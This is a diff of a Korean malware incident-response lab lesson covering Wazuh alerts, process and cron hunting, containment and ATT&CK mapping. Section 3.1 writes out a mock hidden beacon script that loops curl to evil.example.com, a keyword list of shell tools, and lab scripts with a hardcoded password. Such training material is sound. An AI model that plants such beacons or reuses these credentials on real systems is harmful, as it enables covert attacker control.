@@ -1,344 +1,445 @@
-# Week 11: 인시던트 대응 (2) - 악성코드
+# Week 11: 인시던트 대응 실습 (2) - 악성코드
 
 ## 학습 목표
-
-- 의심 파일과 프로세스를 식별하는 방법을 익힌다
-- 프로세스 조사 및 네트워크 활동 분석을 수행한다
-- 악성코드 인시던트의 격리/근절/복구 절차를 실습한다
-- 파일 해시를 활용한 IOC(Indicator of Compromise) 확인 방법을 이해한다
-
----
-
-## 1. 악성코드 인시던트 개요
-
-### 1.1 악성코드 유형
-
-| 유형 | 설명 | 주요 영향 |
-|------|------|----------|
-| 랜섬웨어 | 파일 암호화 후 몸값 요구 | 가용성 |
-| 트로이목마 | 정상 프로그램 위장, 백도어 | 기밀성 |
-| 웜 | 네트워크 전파 | 가용성, 무결성 |
-| 크립토마이너 | 암호화폐 채굴 | 성능 저하 |
-| 웹셸 | 웹 서버에 설치된 원격 제어 | 기밀성, 무결성 |
-| 루트킷 | 시스템 수준 은폐 | 탐지 회피 |
-
-### 1.2 감염 경로
-
-```
-피싱 이메일 → 악성 첨부파일/링크 → 다운로드 → 실행
-취약한 서비스 → 원격 코드 실행 → 페이로드 설치
-공급망 공격 → 정상 업데이트에 악성코드 삽입
-```
+- 의심 파일과 프로세스를 조사하는 기법을 수행한다
+- 악성코드 감염 징후를 시스템 로그에서 탐지한다
+- Wazuh FIM/SCA를 활용한 악성코드 탐지를 이해한다
+- 악성코드 격리와 제거 절차를 수행한다
 
 ---
 
-## 2. 탐지: 의심 프로세스 조사
+## 1. 시나리오: 서버 악성코드 감염 의심
 
-### 2.1 프로세스 목록 분석
+### 1.1 환경
 
-```bash
-# 전체 프로세스 목록 (CPU 사용량 순)
-for ip in 192.168.208.142 192.168.208.150 192.168.208.151 192.168.208.152; do
-  echo "========== $ip =========="
-  sshpass -p1 ssh user@$ip "ps aux --sort=-%cpu | head -15"
-done
+```
+감염 의심 서버: secu (10.20.30.1) - 방화벽/IPS 서버
+모니터링: siem (10.20.30.100) - Wazuh SIEM
+분석 도구: web (10.20.30.80) - 파일 분석
+
+공격 시나리오:
+  1) 공격자가 웹 취약점을 통해 리버스셸 설치
+  2) 지속성 확보를 위한 cron/systemd backdoor
+  3) 정보 유출을 위한 외부 통신
 ```
 
-### 2.2 의심 프로세스 식별 기준
+### 1.2 악성코드 분류
 
-| 의심 기준 | 확인 방법 |
-|-----------|----------|
-| 이름이 이상함 | 랜덤 문자열, 시스템 프로세스 위장 |
-| CPU/메모리 과다 | top, ps aux --sort=-%cpu |
-| 비정상 경로에서 실행 | /tmp, /dev/shm, /var/tmp에서 실행 |
-| 네트워크 연결 | 외부 IP로 지속적 연결 |
-| 실행 시간이 이상 | 서버 시작 전부터 실행 중 |
-
-```bash
-# 의심 경로에서 실행되는 프로세스
-for ip in 192.168.208.142 192.168.208.150 192.168.208.151 192.168.208.152; do
-  echo "=== $ip: 의심 경로 프로세스 ==="
-  sshpass -p1 ssh user@$ip "ls -la /proc/*/exe 2>/dev/null | grep -E '/tmp/|/dev/shm/|/var/tmp/' | head -5"
-done
-
-# /tmp에서 실행 가능 파일
-for ip in 192.168.208.142 192.168.208.150 192.168.208.151 192.168.208.152; do
-  echo "=== $ip ==="
-  sshpass -p1 ssh user@$ip "find /tmp /dev/shm /var/tmp -type f -executable 2>/dev/null"
-done
-```
-
-### 2.3 프로세스 상세 조사
-
-```bash
-# 특정 프로세스 상세 정보 (PID를 알고 있을 때)
-# PID=12345  # 의심 PID로 변경
-sshpass -p1 ssh user@192.168.208.142 "
-  # 프로세스 정보
-  echo '=== 프로세스 정보 ==='
-  ps -p \$(pgrep -n python3 2>/dev/null || echo 1) -o pid,ppid,user,%cpu,%mem,start,args 2>/dev/null | head -5
-
-  # 열린 파일
-  echo '=== 열린 파일 ==='
-  lsof -p \$(pgrep -n python3 2>/dev/null || echo 1) 2>/dev/null | head -10
-
-  # 네트워크 연결
-  echo '=== 네트워크 연결 ==='
-  ss -tnp 2>/dev/null | head -10
-"
-```
+| 유형 | 행위 | 탐지 포인트 |
+|------|------|-----------|
+| 웹셸 | 웹 경로에 실행 파일 생성 | FIM, 웹 로그 |
+| 리버스셸 | 외부 서버로 연결 | 네트워크 로그, 프로세스 |
+| 백도어 | cron/systemd에 등록 | auditd, FIM |
+| 랜섬웨어 | 파일 암호화 | FIM (대량 변경), CPU 급증 |
+| 코인 마이너 | CPU/GPU 점유 | 리소스 모니터링 |
 
 ---
 
-## 3. 탐지: 의심 파일 조사
+## 2. 탐지 (Detection)
 
-### 3.1 최근 생성/변경된 파일
-
-```bash
-# 최근 24시간 내 생성된 실행 파일
-for ip in 192.168.208.142 192.168.208.150 192.168.208.151 192.168.208.152; do
-  echo "=== $ip: 최근 생성 파일 ==="
-  sshpass -p1 ssh user@$ip "find / -type f -mtime -1 \( -perm -100 -o -name '*.sh' -o -name '*.py' -o -name '*.pl' \) 2>/dev/null | grep -v '/proc\|/sys\|/run' | head -10"
-done
-
-# /etc 아래 변경된 파일
-sshpass -p1 ssh user@192.168.208.142 "find /etc -type f -mtime -1 2>/dev/null | head -10"
-```
-
-### 3.2 파일 해시 확인
+### 2.1 Wazuh 경보에서 악성코드 징후
 
 ```bash
-# 의심 파일의 해시 생성
-sshpass -p1 ssh user@192.168.208.142 "
-  echo '=== /tmp 내 파일 해시 ==='
-  find /tmp -type f -maxdepth 2 2>/dev/null | while read f; do
-    sha256sum \"\$f\" 2>/dev/null
-  done | head -10
-"
-```
+# Wazuh SIEM에서 파일 무결성 변경 알림 확인
+sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.100 << 'ENDSSH'
+echo "=== Wazuh FIM 경보 확인 ==="
 
-### 3.3 IOC 확인
-
-파일 해시를 VirusTotal 등에서 조회하여 악성 여부를 확인한다:
-
-```bash
-# 해시를 VirusTotal API로 조회 (API 키 필요)
-# curl -s "https://www.virustotal.com/api/v3/files/{hash}" -H "x-apikey: {key}"
-
-# OpenCTI에서 IOC 검색 (실습 환경)
-# 브라우저: http://192.168.208.152:9400
-echo "OpenCTI 접속: http://192.168.208.152:9400"
-echo "IOC 검색: 해시값 또는 IP 주소로 검색"
-```
-
----
-
-## 4. 탐지: 네트워크 활동 분석
-
-### 4.1 외부 연결 확인
-
-```bash
-# ESTABLISHED 연결 (외부 통신)
-for ip in 192.168.208.142 192.168.208.150 192.168.208.151 192.168.208.152; do
-  echo "=== $ip: 외부 연결 ==="
-  sshpass -p1 ssh user@$ip "ss -tnp state established 2>/dev/null | grep -v '192.168.208\|10.20.30\|127.0.0' | head -10"
-done
-```
-
-### 4.2 비정상 리스닝 포트
-
-```bash
-# 알려지지 않은 리스닝 포트
-for ip in 192.168.208.142 192.168.208.150 192.168.208.151 192.168.208.152; do
-  echo "=== $ip ==="
-  sshpass -p1 ssh user@$ip "ss -tlnp | grep LISTEN"
-done
-```
-
-### 4.3 DNS 쿼리 분석
-
-```bash
-# DNS 트래픽 확인 (비정상 DNS = C2 가능)
-sshpass -p1 ssh user@192.168.208.150 "cat /var/log/suricata/eve.json 2>/dev/null | python3 -c \"
+# FIM 관련 경보 (rule.group: syscheck)
+cat /var/ossec/logs/alerts/alerts.json 2>/dev/null | python3 -c "
 import sys, json
-from collections import Counter
-domains = Counter()
+alerts = []
 for line in sys.stdin:
     try:
-        e = json.loads(line)
-        if e.get('event_type') == 'dns':
-            d = e.get('dns',{}).get('rrname','')
-            if d: domains[d] += 1
+        a = json.loads(line.strip())
+        if 'syscheck' in str(a.get('rule',{}).get('groups',[])):
+            alerts.append(a)
     except: pass
-print('=== Top 10 DNS 쿼리 ===')
-for d, c in domains.most_common(10):
-    print(f'  {c:4d}: {d}')
-\" 2>/dev/null"
-```
 
----
+print(f'FIM 경보 수: {len(alerts)}')
+for a in alerts[-5:]:
+    rule = a.get('rule',{})
+    syscheck = a.get('syscheck',{})
+    print(f'  [{rule.get(\"level\",0)}] {rule.get(\"description\",\"\")}')
+    print(f'       파일: {syscheck.get(\"path\",\"N/A\")}')
+    print(f'       이벤트: {syscheck.get(\"event\",\"N/A\")}')
+" 2>/dev/null || echo "FIM 경보 없음 (정상 환경)"
 
-## 5. Wazuh에서의 악성코드 탐지
-
-### 5.1 파일 무결성 모니터링 (FIM) 알림
-
-```bash
-# 파일 변경 탐지 알림
-sshpass -p1 ssh user@192.168.208.152 "cat /var/ossec/logs/alerts/alerts.json 2>/dev/null | python3 -c \"
+echo ""
+echo "=== 높은 심각도 경보 (Level >= 10) ==="
+cat /var/ossec/logs/alerts/alerts.json 2>/dev/null | python3 -c "
 import sys, json
 for line in sys.stdin:
     try:
-        a = json.loads(line)
-        r = a.get('rule',{})
-        groups = str(r.get('groups',[]))
-        if 'syscheck' in groups or 'integrity' in groups:
-            print(f'  {a.get(\"timestamp\",\"\")} [{r.get(\"level\",0)}] {r.get(\"description\",\"\")}')
-            syscheck = a.get('syscheck',{})
-            if syscheck.get('path'):
-                print(f'    파일: {syscheck[\"path\"]}')
+        a = json.loads(line.strip())
+        if a.get('rule',{}).get('level',0) >= 10:
+            rule = a['rule']
+            print(f'  [{rule[\"level\"]}] {rule.get(\"id\",\"\")} - {rule.get(\"description\",\"\")}')
     except: pass
-\" 2>/dev/null | tail -20"
+" 2>/dev/null | tail -10 || echo "고심각도 경보 없음"
+ENDSSH
 ```
 
-### 5.2 rootcheck 결과
+### 2.2 secu 서버 프로세스 조사
 
 ```bash
-# rootkit/malware 탐지 결과
-sshpass -p1 ssh user@192.168.208.152 "cat /var/ossec/logs/alerts/alerts.json 2>/dev/null | python3 -c \"
-import sys, json
-for line in sys.stdin:
-    try:
-        a = json.loads(line)
-        r = a.get('rule',{})
-        if 'rootcheck' in str(r.get('groups',[])) or 'rootkit' in str(r.get('description','')).lower():
-            print(f'  [{r.get(\"level\",0)}] {r.get(\"description\",\"\")}')
-    except: pass
-\" 2>/dev/null | tail -10"
+# 의심 프로세스 탐색
+sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.1 << 'ENDSSH'
+echo "=== 의심 프로세스 탐색 ==="
+
+# 1. 비정상 네트워크 연결 프로세스
+echo "--- 외부 연결 프로세스 ---"
+ss -tnp 2>/dev/null | grep -v "127.0.0.1\|::1\|10.20.30" | head -10
+
+echo ""
+echo "--- ESTABLISHED 연결 ---"
+ss -tnp state established 2>/dev/null | head -10
+
+echo ""
+# 2. 의심 프로세스 (숨김 파일에서 실행)
+echo "--- /dev/shm, /tmp, /var/tmp 에서 실행 중인 프로세스 ---"
+ls -la /dev/shm/ /tmp/ /var/tmp/ 2>/dev/null | grep -E "^-.*x" | head -10
+ps aux 2>/dev/null | grep -E "/dev/shm|/tmp/\.|/var/tmp" | grep -v grep
+
+echo ""
+# 3. 최근 생성/수정된 실행 파일
+echo "--- 최근 24시간 내 변경된 실행 파일 ---"
+find /usr/local/bin /usr/bin /opt -newer /tmp -maxdepth 2 -type f 2>/dev/null | head -10
+
+echo ""
+# 4. 숨김 파일 탐색
+echo "--- 숨김 실행 파일 ---"
+find /tmp /dev/shm /var/tmp -name ".*" -type f 2>/dev/null | head -10
+
+echo ""
+# 5. CPU 사용량 상위 프로세스
+echo "--- CPU 상위 5개 프로세스 ---"
+ps aux --sort=-%cpu 2>/dev/null | head -6
+ENDSSH
 ```
 
----
-
-## 6. 격리 및 근절
-
-### 6.1 프로세스 종료
+### 2.3 cron/systemd 백도어 탐색
 
 ```bash
-# 의심 프로세스 종료 (시연)
-echo "=== 프로세스 종료 명령 (시연) ==="
-echo "kill -9 <PID>        # 특정 프로세스 종료"
-echo "pkill -f '<pattern>' # 패턴으로 종료"
-echo "주의: 정상 프로세스를 종료하지 않도록 반드시 확인 후 실행"
-```
+sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.1 << 'ENDSSH'
+echo "=== cron 백도어 탐색 ==="
 
-### 6.2 악성 파일 제거
-
-```bash
-# 격리 (삭제 전 보존)
-echo "=== 악성 파일 격리 절차 ==="
-echo "1. mkdir -p /tmp/quarantine"
-echo "2. cp suspicious_file /tmp/quarantine/"
-echo "3. sha256sum /tmp/quarantine/suspicious_file > /tmp/quarantine/hash.txt"
-echo "4. rm suspicious_file"
-```
-
-### 6.3 지속성 메커니즘 제거
-
-```bash
-# cron 작업 확인 (백도어 가능)
-for ip in 192.168.208.142 192.168.208.150 192.168.208.151 192.168.208.152; do
-  echo "=== $ip: cron ==="
-  sshpass -p1 ssh user@$ip "crontab -l 2>/dev/null; ls -la /etc/cron.d/ /etc/cron.daily/ 2>/dev/null | head -5"
+# 모든 사용자 crontab
+echo "--- 전체 crontab ---"
+for user in $(cut -d: -f1 /etc/passwd); do
+  CRON=$(crontab -l -u $user 2>/dev/null)
+  if [ -n "$CRON" ]; then
+    echo "[$user]"
+    echo "$CRON"
+    echo ""
+  fi
 done
 
-# systemd 서비스 확인 (의심 서비스)
-sshpass -p1 ssh user@192.168.208.142 "systemctl list-unit-files --type=service | grep enabled | grep -v 'system\|network\|ssh\|cron\|rsyslog\|wazuh'"
+# /etc/cron.d 디렉토리
+echo "--- /etc/cron.d ---"
+ls -la /etc/cron.d/ 2>/dev/null
 
-# authorized_keys 확인 (SSH 백도어)
-for ip in 192.168.208.142 192.168.208.150 192.168.208.151 192.168.208.152; do
-  echo "=== $ip ==="
-  sshpass -p1 ssh user@$ip "cat /home/*/.ssh/authorized_keys /root/.ssh/authorized_keys 2>/dev/null || echo '없음'"
-done
+echo ""
+echo "=== systemd 서비스 탐색 ==="
+# 최근 생성된 서비스 파일
+echo "--- 사용자 정의 서비스 ---"
+find /etc/systemd/system /usr/lib/systemd/system -name "*.service" -newer /etc/hostname 2>/dev/null | head -10
 
-# .bashrc 등 쉘 시작 파일 확인
-sshpass -p1 ssh user@192.168.208.142 "tail -5 /home/*/.bashrc /root/.bashrc 2>/dev/null"
+# 활성 상태의 의심 서비스
+echo ""
+echo "--- 활성 서비스 (사용자 정의) ---"
+systemctl list-units --type=service --state=running 2>/dev/null | \
+  grep -v -E "systemd|ssh|cron|docker|suricata|nftables|rsyslog|wazuh|dbus|getty" | head -10
+
+echo ""
+echo "=== 로그인 기록 점검 ==="
+echo "--- 최근 로그인 ---"
+last -10 2>/dev/null
+
+echo ""
+echo "--- SSH 인증 실패 ---"
+grep "Failed password" /var/log/auth.log 2>/dev/null | tail -5
+ENDSSH
 ```
 
 ---
 
-## 7. ATT&CK 매핑
+## 3. 분석 (Analysis)
 
-| 관찰 내용 | 전술 | 기법 |
-|-----------|------|------|
-| 악성 파일 다운로드 | TA0002 Execution | T1059 Command Interpreter |
-| /tmp에서 실행 | TA0005 Defense Evasion | T1036 Masquerading |
-| cron 등록 | TA0003 Persistence | T1053 Scheduled Task |
-| 외부 IP 연결 | TA0011 C2 | T1071 Application Layer Protocol |
-| SSH 키 추가 | TA0003 Persistence | T1098 Account Manipulation |
-| 로그 삭제 | TA0005 Defense Evasion | T1070 Indicator Removal |
-
----
-
-## 8. 종합 점검 스크립트
+### 3.1 의심 파일 정적 분석
 
 ```bash
+# 의심 파일이 발견되었다고 가정하고 분석 절차 실습
+sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.1 << 'ENDSSH'
+echo "=== 파일 분석 시뮬레이션 ==="
+
+# 분석용 샘플 파일 생성 (교육용)
+cat > /tmp/.hidden_test << 'SAMPLE'
 #!/bin/bash
-echo "============================================"
-echo " 악성코드 인시던트 조사 - $(date)"
-echo "============================================"
+# 교육용 샘플 - 실제 악성코드 아님
+while true; do
+  curl -s http://evil.example.com/beacon >/dev/null 2>&1
+  sleep 300
+done
+SAMPLE
 
-IP=$1
-if [ -z "$IP" ]; then echo "Usage: $0 <IP>"; exit 1; fi
+# 1. 파일 유형 확인
+echo "--- file 명령 ---"
+file /tmp/.hidden_test
 
-echo "[1] 의심 프로세스 (CPU Top 5)"
-sshpass -p1 ssh user@$IP "ps aux --sort=-%cpu | head -6"
-
+# 2. 문자열 추출
 echo ""
-echo "[2] /tmp 실행 파일"
-sshpass -p1 ssh user@$IP "find /tmp /dev/shm /var/tmp -type f -executable 2>/dev/null"
+echo "--- strings 분석 ---"
+strings /tmp/.hidden_test | grep -iE "http|curl|wget|nc|bash|eval|exec|base64"
 
+# 3. 해시 계산 (IOC용)
 echo ""
-echo "[3] 외부 네트워크 연결"
-sshpass -p1 ssh user@$IP "ss -tnp state established 2>/dev/null | grep -v '192.168\|10.20\|127.0'"
+echo "--- 파일 해시 ---"
+md5sum /tmp/.hidden_test 2>/dev/null
+sha256sum /tmp/.hidden_test 2>/dev/null
 
+# 4. 파일 타임스탬프
 echo ""
-echo "[4] 비정상 리스닝 포트"
-sshpass -p1 ssh user@$IP "ss -tlnp 2>/dev/null | grep LISTEN"
+echo "--- 타임스탬프 ---"
+stat /tmp/.hidden_test 2>/dev/null | grep -E "Access|Modify|Change|Birth"
 
-echo ""
-echo "[5] 최근 변경 파일 (24h)"
-sshpass -p1 ssh user@$IP "find /etc /usr/local -type f -mtime -1 2>/dev/null | head -10"
+# 정리
+rm -f /tmp/.hidden_test
+ENDSSH
+```
 
-echo ""
-echo "[6] cron 작업"
-sshpass -p1 ssh user@$IP "crontab -l 2>/dev/null; cat /etc/crontab 2>/dev/null | grep -v '^#' | grep -v '^$'"
+### 3.2 네트워크 IOC 분석
 
+```bash
+sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.1 << 'ENDSSH'
+echo "=== 네트워크 IOC 분석 ==="
+
+# 1. DNS 쿼리 로그 (의심 도메인)
+echo "--- DNS 쿼리 확인 ---"
+grep -r "query" /var/log/syslog 2>/dev/null | grep -viE "local|arpa|ubuntu" | tail -5
+
+# 2. Suricata 알림에서 C2 통신 징후
 echo ""
-echo "[7] SSH authorized_keys"
-sshpass -p1 ssh user@$IP "cat ~/.ssh/authorized_keys 2>/dev/null || echo '없음'"
+echo "--- Suricata C2 관련 알림 ---"
+grep -iE "trojan|malware|c2|command.and.control|botnet|coinminer" \
+  /var/log/suricata/fast.log 2>/dev/null | tail -10 || echo "C2 알림 없음"
+
+# 3. 비정상 포트 연결
+echo ""
+echo "--- 비표준 포트 외부 연결 ---"
+ss -tnp 2>/dev/null | awk '$4 !~ /:(22|80|443|8000|8002|3000)$/' | \
+  grep -v "127.0.0.1\|::1" | head -10
+
+# 4. iptables/nftables 로그에서 차단된 연결
+echo ""
+echo "--- 방화벽 차단 로그 ---"
+dmesg 2>/dev/null | grep -iE "drop|reject|block" | tail -5
+ENDSSH
+```
+
+### 3.3 LLM 기반 로그 분석
+
+```bash
+# Ollama로 의심 로그 분석
+curl -s http://192.168.0.105:11434/v1/chat/completions \
+  -H "Content-Type: application/json" \
+  -d '{
+    "model": "gemma3:12b",
+    "messages": [
+      {"role": "system", "content": "SOC 분석관입니다. 보안 로그를 분석하여 악성코드 감염 여부를 판단합니다. 한국어로 답변하세요."},
+      {"role": "user", "content": "다음 로그를 분석하세요:\n\n1. /dev/shm에 .cache라는 실행 파일 발견\n2. crontab에 \"*/5 * * * * /dev/shm/.cache\" 등록\n3. ss 출력에서 외부 IP 45.33.xx.xx:4444로 ESTABLISHED 연결\n4. 해당 프로세스 CPU 사용량 98%\n\n1) 악성코드 유형 추정\n2) MITRE ATT&CK 매핑\n3) 대응 우선순위\n를 제시하세요."}
+    ],
+    "temperature": 0.3
+  }' | python3 -c "import json,sys; print(json.load(sys.stdin)['choices'][0]['message']['content'])"
 ```
 
 ---
 
-## 9. 핵심 정리
+## 4. 격리 (Containment)
 
-1. **프로세스 조사** = CPU/메모리, 실행 경로, 네트워크 연결
-2. **파일 조사** = 최근 변경 파일, 해시, IOC 확인
-3. **네트워크 조사** = 외부 연결, 비정상 포트, DNS 분석
-4. **지속성 제거** = cron, systemd, SSH 키, 쉘 시작 파일
-5. **증거 보존** = 삭제 전 복사 + 해시 기록
+### 4.1 네트워크 격리
+
+```bash
+sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.1 << 'ENDSSH'
+echo "=== 네트워크 격리 시뮬레이션 ==="
+
+# 실제 격리는 수행하지 않음 - 규칙 예시만 표시
+echo "--- 외부 통신 차단 nftables 규칙 (예시) ---"
+cat << 'RULES'
+# 감염 서버 외부 통신 차단 (관리 SSH만 허용)
+nft add rule inet filter output ip daddr != 10.20.30.0/24 drop
+nft add rule inet filter output tcp dport 22 ip daddr 10.20.30.0/24 accept
+
+# 특정 C2 IP 차단
+nft add rule inet filter output ip daddr 45.33.0.0/16 drop
+nft add rule inet filter input ip saddr 45.33.0.0/16 drop
+RULES
+
+echo ""
+echo "--- 현재 nftables 규칙 확인 ---"
+echo "1" | sudo -S nft list ruleset 2>/dev/null | head -20
+ENDSSH
+```
+
+### 4.2 프로세스 격리
+
+```bash
+sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.1 << 'ENDSSH'
+echo "=== 프로세스 격리 절차 (교육용) ==="
+
+cat << 'PROCEDURE'
+악성 프로세스 격리 절차:
+
+1. 프로세스 정보 수집 (kill 전에 반드시)
+   $ ps aux | grep [의심PID]
+   $ ls -la /proc/[PID]/exe
+   $ cat /proc/[PID]/cmdline
+   $ ls -la /proc/[PID]/fd/
+
+2. 메모리 덤프 (포렌식용)
+   $ gcore [PID]
+
+3. 프로세스 중지
+   $ kill -STOP [PID]    # 먼저 일시 중지
+   $ kill -9 [PID]       # 확인 후 종료
+
+4. 지속성 제거
+   $ crontab -l | grep -v "의심파일" | crontab -
+   $ systemctl disable 의심서비스
+
+5. 의심 파일 격리
+   $ mkdir -p /evidence/$(date +%Y%m%d)
+   $ cp -p /dev/shm/.cache /evidence/$(date +%Y%m%d)/
+   $ sha256sum /evidence/$(date +%Y%m%d)/.cache > /evidence/$(date +%Y%m%d)/hash.txt
+   $ rm /dev/shm/.cache
+PROCEDURE
+ENDSSH
+```
 
 ---
 
-## 과제
+## 5. 제거 및 복구 (Eradication & Recovery)
 
-1. 4개 서버에서 의심 프로세스/파일/네트워크 활동을 조사하시오
-2. 발견한 이상 징후를 ATT&CK 기법에 매핑하시오
-3. 악성코드 인시던트 대응 보고서를 작성하시오
+### 5.1 시스템 무결성 검증
+
+```bash
+sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.1 << 'ENDSSH'
+echo "=== 시스템 무결성 검증 ==="
+
+# 1. 패키지 무결성 확인
+echo "--- dpkg 패키지 무결성 ---"
+dpkg --verify 2>/dev/null | head -10 || echo "dpkg verify 미지원"
+
+# 2. 중요 바이너리 해시 확인
+echo ""
+echo "--- 핵심 바이너리 해시 ---"
+for bin in /usr/bin/ssh /usr/bin/sudo /usr/bin/curl /bin/bash; do
+  if [ -f "$bin" ]; then
+    HASH=$(sha256sum "$bin" 2>/dev/null | cut -d' ' -f1)
+    echo "$bin: ${HASH:0:16}..."
+  fi
+done
+
+# 3. SSH 키 점검
+echo ""
+echo "--- SSH authorized_keys ---"
+for home in /home/* /root; do
+  if [ -f "$home/.ssh/authorized_keys" ]; then
+    echo "[$home]"
+    wc -l "$home/.ssh/authorized_keys" 2>/dev/null
+    cat "$home/.ssh/authorized_keys" 2>/dev/null | head -3
+  fi
+done
+
+# 4. SUID 파일 점검
+echo ""
+echo "--- 비정상 SUID 파일 ---"
+find / -perm -4000 -type f 2>/dev/null | \
+  grep -v -E "^/(usr/(bin|lib|sbin)|bin|sbin)/" | head -5 || echo "비정상 SUID 없음"
+ENDSSH
+```
+
+### 5.2 Wazuh SCA 활용
+
+```bash
+sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.100 << 'ENDSSH'
+echo "=== Wazuh SCA 결과 확인 ==="
+
+cat /var/ossec/logs/alerts/alerts.json 2>/dev/null | python3 -c "
+import sys, json
+sca_alerts = []
+for line in sys.stdin:
+    try:
+        a = json.loads(line.strip())
+        groups = a.get('rule',{}).get('groups',[])
+        if 'sca' in groups or 'policy_monitoring' in str(groups):
+            sca_alerts.append(a)
+    except: pass
+
+if sca_alerts:
+    print(f'SCA 경보 수: {len(sca_alerts)}')
+    for a in sca_alerts[-5:]:
+        rule = a.get('rule',{})
+        print(f'  [{rule.get(\"level\",0)}] {rule.get(\"description\",\"\")}')
+else:
+    print('SCA 경보 없음 (정책 점검 미구성 또는 정상)')
+" 2>/dev/null
+ENDSSH
+```
 
 ---
 
-## 참고 자료
+## 6. 사후 분석과 보고 (Post-Incident)
 
-- SANS Malware Analysis Cheat Sheet
-- Linux Forensics for Incident Responders
-- VirusTotal (https://www.virustotal.com)
+### 6.1 인시던트 타임라인 작성
+
+```bash
+curl -s http://192.168.0.105:11434/v1/chat/completions \
+  -H "Content-Type: application/json" \
+  -d '{
+    "model": "gemma3:12b",
+    "messages": [
+      {"role": "system", "content": "인시던트 대응 보고서 작성 전문가입니다. 한국어로 작성합니다."},
+      {"role": "user", "content": "다음 사건의 인시던트 대응 보고서 타임라인을 작성하세요:\n\n- 09:00 Wazuh FIM 경보: /dev/shm/.cache 파일 생성 탐지\n- 09:05 Suricata 경보: 외부 IP 45.33.x.x:4444 연결 시도\n- 09:10 SOC 분석관 확인: crontab에 5분마다 .cache 실행 등록\n- 09:15 CPU 98% 사용 확인 (코인 마이너 의심)\n- 09:20 네트워크 격리 (nftables 외부 차단)\n- 09:25 프로세스 중지, 파일 격리 및 해시 보존\n- 09:30 crontab 백도어 제거, 시스템 무결성 검증\n- 09:45 서비스 정상화 확인\n\nMITRE ATT&CK 매핑과 교훈(Lessons Learned)도 포함하세요."}
+    ],
+    "temperature": 0.3
+  }' | python3 -c "import json,sys; print(json.load(sys.stdin)['choices'][0]['message']['content'])"
+```
+
+### 6.2 ATT&CK 매핑 실습
+
+```bash
+sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 << 'ENDSSH'
+python3 << 'PYEOF'
+attack_mapping = [
+    ("Initial Access", "T1190", "Exploit Public-Facing App", "웹 취약점으로 초기 침입"),
+    ("Execution", "T1059.004", "Unix Shell", "/dev/shm/.cache 실행"),
+    ("Persistence", "T1053.003", "Cron", "crontab 등록으로 지속성 확보"),
+    ("Defense Evasion", "T1564.001", "Hidden Files", ".cache 숨김 파일 사용"),
+    ("Defense Evasion", "T1036", "Masquerading", "정상 파일명(.cache)으로 위장"),
+    ("C2", "T1071.001", "Web Protocols", "HTTP로 C2 비콘 통신"),
+    ("Impact", "T1496", "Resource Hijacking", "코인 마이너로 CPU 점유"),
+]
+
+print(f"{'Tactic':<20} {'ID':<14} {'Technique':<30} {'분석'}")
+print("=" * 90)
+for tactic, tid, tech, analysis in attack_mapping:
+    print(f"{tactic:<20} {tid:<14} {tech:<30} {analysis}")
+PYEOF
+ENDSSH
+```
+
+---
+
+## 핵심 정리
+
+1. 악성코드 탐지는 FIM, 프로세스 모니터링, 네트워크 분석을 조합한다
+2. /dev/shm, /tmp의 숨김 파일과 비정상 cron 항목이 주요 탐지 포인트다
+3. 분석 전에 반드시 증거(해시, 메모리 덤프)를 보존한다
+4. 격리는 네트워크 차단 후 프로세스 중지 순서로 수행한다
+5. 사후 분석에서 ATT&CK 매핑과 Lessons Learned가 핵심이다
+6. Wazuh FIM/SCA는 악성코드 탐지의 핵심 모니터링 도구다
+
+---
+
+## 다음 주 예고
+- Week 12: 인시던트 대응 실습 (3) - 내부 위협 (sudo 남용, 비인가 접근)
